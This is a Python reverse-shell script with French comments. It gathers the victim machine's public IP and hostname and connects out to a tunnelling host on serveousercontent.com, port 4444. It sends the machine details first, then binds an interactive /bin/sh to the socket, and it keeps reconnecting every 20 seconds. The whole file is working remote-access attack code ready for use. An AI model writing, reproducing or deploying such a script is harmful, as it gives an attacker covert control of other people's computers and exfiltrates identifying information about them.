import socket
import subprocess
import os
import time
import urllib.request  # Pour récupérer l'IP publique via HTTP

# --- CONFIGURATION ---
URL_SERVEO = "103fa379dfd22edd-93-23-16-243.serveousercontent.com"
PORT_SERVEO = 4444

def obtenir_ip_publique():
    try:
        # Utilisation d'un service API simple pour obtenir l'IP
        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
    except:
        return "IP Inconnue"

def connecter():
    while True:
        try:
            # 1. Récupérer les infos de la machine cible
            ip_cible = obtenir_ip_publique()
            nom_machine = socket.gethostname()
            infos = f"--- Nouvelle Connexion ---\nIP Publique: {ip_cible}\nHostname: {nom_machine}\n--------------------------\n"

            # 2. Création de la socket et connexion
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((URL_SERVEO, PORT_SERVEO))

            # 3. Envoyer les infos au serveur dès la connexion
            s.send(infos.encode('utf-8'))

            # 4. Redirection des flux pour le shell
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # 5. Lancement du shell
            subprocess.call(["/bin/sh", "-i"])

        except Exception:
            # Attendre 20 secondes avant de réessayer si la connexion échoue
            time.sleep(20)
            continue
        finally:
            s.close()

if __name__ == "__main__":
    connecter()
